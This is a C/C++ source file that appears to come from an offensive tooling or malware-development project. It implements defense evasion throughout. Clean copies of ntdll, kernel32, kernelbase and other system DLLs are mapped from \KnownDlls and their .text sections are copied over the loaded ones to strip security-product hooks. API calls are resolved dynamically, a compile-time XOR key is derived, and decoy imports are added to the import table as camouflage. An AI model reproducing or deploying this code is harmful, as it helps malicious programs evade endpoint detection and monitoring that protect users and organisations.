#include "camouflage.h"
#include "Utility.h"
#include "FunctionPtrs.h"
#include <memoryapi.h>
#include "driverInterface.h"


	
static void Map_Dll(OUT PVOID* pBuffer, IN const WCHAR* Knowndll)
{

	HANDLE			   hSection = NULL;
	ULONG					result = 1;
	LPVOID			  dllBuffer = NULL;
	UNICODE_STRING		uniStr = { 0 };
	OBJECT_ATTRIBUTES	objAtr = { 0 };


	uniStr.Buffer = (PWSTR)Knowndll;
	uniStr.Length = (USHORT)wcslen(Knowndll) * sizeof(WCHAR);
	uniStr.MaximumLength = (USHORT)uniStr.Length + sizeof(WCHAR);

	InitializeObjectAttributes(&objAtr, &uniStr, OBJ_CASE_INSENSITIVE, NULL, NULL);

	fnNtOpenSection pNtOpenSection = (fnNtOpenSection)Function_PTR(L"ntdll.dll", "NtOpenSection");

	if (!NT_SUCCESS(result = pNtOpenSection(&hSection, SECTION_MAP_READ, &objAtr)))
	{
		printf("\033[0;31m[!]\033[0mNtOpenSection Failed With Error : 0x%lu \n", result);
		return;
	}

	fnMapViewOfFile pMapViewOfFile = (fnMapViewOfFile)Function_PTR(L"KERNEL32.DLL", "MapViewOfFile");

	dllBuffer = pMapViewOfFile(hSection, FILE_MAP_READ, NULL, NULL, NULL);
	if (!dllBuffer)
	{
		printf_s("\033[0;31m[!]\033[0mFailed To Map File With ERROR : %d\n", GetLastError());
		return;
	}

	*pBuffer = dllBuffer;

	CloseHandle(hSection);
}

static PVOID DLL_Base_Addr(IN const WCHAR* Sys32Dll)
{
	
	PVOID	 Base = NULL;
	DWORD cbNeeded = 0;
	HMODULE lphModule[1024] = { 0 };
	int i = 0, cModules = 0;

	fnK32EnumProcessModules pK32EnumProcessModules = (fnK32EnumProcessModules)Function_PTR(L"KERNEL32.DLL", "K32EnumProcessModules");
	fnGetModuleFileNameW pGetModuleFileNameW = (fnGetModuleFileNameW)Function_PTR(L"KERNEL32.DLL", "GetModuleFileNameW");

	if (pK32EnumProcessModules(GetCurrentProcess(), lphModule, sizeof(lphModule), &cbNeeded))
	{

		cModules = cbNeeded / sizeof(lphModule[0]);
		far WCHAR module[MAX_PATH] = { 0 };

		for (; i < cModules; i++)
		{

			pGetModuleFileNameW(lphModule[i], module, MAX_PATH);

			if (RSHasher((PWCHAR)Sys32Dll, module))
			{
				return lphModule[i];
			}
		}
	}
	else
	{
		printf("\033[0;31m[!]\033[0mEnumProcess Modules Failed With Error : %d\n", GetLastError());
		return NULL;
	}
	return NULL;
}

static BOOL Read_Text_Section(IN const WCHAR* KnownDll, IN const WCHAR* Sys32Dll)
{

	SIZE_T					szText = 0;
	PVOID			   localDll = NULL,
					  remoteDll = NULL,
			   localTextSection = NULL,
			  remoteTextSection = NULL;
	LPCVOID		   remoteHeader = NULL;
	PIMAGE_DOS_HEADER	  p_idh = NULL;
	PIMAGE_NT_HEADERS	  p_inh = NULL;
	PIMAGE_SECTION_HEADER p_ish = NULL;



	localDll = (PVOID)DLL_Base_Addr(Sys32Dll);

	if (localDll)
	{
		p_idh = (PIMAGE_DOS_HEADER)localDll;
		if (p_idh->e_magic != IMAGE_DOS_SIGNATURE) return FALSE;

		p_inh = (PIMAGE_NT_HEADERS)((LPBYTE)localDll + p_idh->e_lfanew);
		if (p_inh->Signature != IMAGE_NT_SIGNATURE) return FALSE;
	}


	Map_Dll(&remoteDll, KnownDll);
	if (!remoteDll) return FALSE;

	remoteHeader = remoteDll;

	p_ish = IMAGE_FIRST_SECTION(p_inh);
	if (!p_ish)
	{
		printf("\033[0;31m[!]\033[!]Failed To Get First Section");
		return FALSE;
	}
	for (int i = 0; i < p_inh->FileHeader.NumberOfSections; i++)
	{
		if ((*(PULONG)p_ish[i].Name | 0x20202020) == 'xet.')
		{
			localTextSection = C_PTR(((ULONG_PTR)localDll + p_ish[i].VirtualAddress));
			remoteTextSection = C_PTR(((ULONG_PTR)remoteDll + p_ish[i].VirtualAddress));
			szText = p_ish[i].Misc.VirtualSize;
			break;
		}
	}


	if (!localTextSection || !remoteTextSection || szText == 0) return FALSE;

	if (*(PULONG)localTextSection != *(PULONG)remoteTextSection) return FALSE;


	DWORD dwOldProtect = NULL;

	fnVirtualProtect pVirtualProtect = (fnVirtualProtect)Function_PTR(L"KERNEL32.DLL", "VirtualProtect");

	if (!pVirtualProtect(localTextSection, szText, PAGE_EXECUTE_WRITECOPY, &dwOldProtect)) {
		printf("\033[0;31m[!]\033[0mVirtualProtect [1] Failed With Error : %d\n", GetLastError());
		return FALSE;
	}

	memcpy(localTextSection, remoteTextSection, szText);

	if (!pVirtualProtect(localTextSection, szText, dwOldProtect, &dwOldProtect)) {
		printf("\033[0;31m[!]\033[0mVirtualProtect [2] Failed With Error : %d\n", GetLastError());
		return FALSE;
	}

	return TRUE;
}



BOOL UnHook_Dlls(IN int name)
{

	const WCHAR* KnwnDLL{};
	const WCHAR* Sys32DLL{};


	switch (name)
	{
	case 1:
		KnwnDLL = L"\\KnownDlls\\ntdll.dll";
		Sys32DLL = L"C:\\Windows\\SYSTEM32\\ntdll.dll";
		break;
	case 2:
		KnwnDLL = L"\\KnownDlls\\kernelbase.dll";
		Sys32DLL = L"C:\\Windows\\System32\\KERNELBASE.dll";
		break;
	case 3:
		KnwnDLL = L"\\KnownDlls\\kernel32.dll";
		Sys32DLL = L"C:\\Windows\\System32\\KERNEL32.DLL";
		break;
	case 4:
		KnwnDLL = L"\\KnownDlls\\advapi32.dll";
		Sys32DLL = L"C:\\Windows\\System32\\ADVAPI32.dll";
		break;
	case 5:
		KnwnDLL = L"\\KnownDlls\\ucrtbase.dll";
		Sys32DLL = L"C:\\Windows\\System32\\ucrtbase.dll";
		break;
	case 6:
		KnwnDLL = L"\\KnownDlls\\user32.dll";
		Sys32DLL = L"C:\\Windows\\System32\\USER32.dll";
		break;
	case 7:
		KnwnDLL = L"\\KnownDlls\\sechost.dll";
		Sys32DLL = L"C:\\Windows\\System32\\sechost.dll";
		break;
	case 8:
		KnwnDLL = L"\\KnownDlls\\IMM32.dll";
		Sys32DLL = L"C:\\Windows\\System32\\IMM32.DLL";
		break;
	case 9:
		KnwnDLL = L"\\KnownDlls\\msvcp_win.dll";
		Sys32DLL = L"C:\\Windows\\System32\\msvcp_win.dll";
		break;
	}

	if (Read_Text_Section(KnwnDLL, Sys32DLL)) return TRUE;

	return FALSE;
}

namespace Random_Seed
{

	constexpr ULONG ExprXorKey(VOID)
	{
		return '0' * -40271 +
			__TIME__[7] * 1 +
			__TIME__[6] * 10 +
			__TIME__[4] * 60 +
			__TIME__[3] * 600 +
			__TIME__[1] * 3600 +
			__TIME__[0] * 36000;
	}

	constexpr uint32_t modulus()
	{
		return 0x7fffffff;
	}

	template<size_t N>
	constexpr uint32_t seed(const char(&entropy)[N], const uint32_t iv = 0) {
		auto value{ iv };
		for (size_t i{ 0 }; i < N; i++) {

			value = (value & ((~0) << 8)) | ((value & 0xFF) ^ entropy[i]);

			value = value << 8 | value >> ((sizeof(value) * 8) - 8);
		}

		while (value > modulus()) value = value >> 1;
		return value << 1 | 1;
	}

	constexpr uint32_t prng(const uint32_t input) {
		return (input * 48271) % modulus();
	}

	ULONG KeyXorObf = seed(__FILE__, ExprXorKey());
};

static PVOID Helper(PVOID* ppAddress) 
{
	using namespace Random_Seed;
	PVOID pAddress = HeapAlloc(GetProcessHeap(), HEAP_ZERO_MEMORY, 0xFF);
	if (!pAddress)
		return NULL;

	*(int*)pAddress = KeyXorObf % 0xFF;

	*ppAddress = pAddress;
	return pAddress;
}


VOID IatCamouflage() 
{

	PVOID		     pAddress = NULL;
	int* A = (int*)Helper(&pAddress);


	if (*A > 350) {

		
		unsigned __int64 i = MessageBoxA(NULL, NULL, NULL, NULL);
		i = GetLastError();
		i = SetCriticalSectionSpinCount(NULL, NULL);
		i = GetWindowContextHelpId(NULL);
		i = GetWindowLongPtrW(NULL, NULL);
		i = RegisterClassW(NULL);
		i = IsWindowVisible(NULL);
		i = ConvertDefaultLocale(NULL);
		i = MultiByteToWideChar(NULL, NULL, NULL, NULL, NULL, NULL);
		i = IsDialogMessageW(NULL, NULL);
	}

	
	HeapFree(GetProcessHeap(), 0, pAddress);
}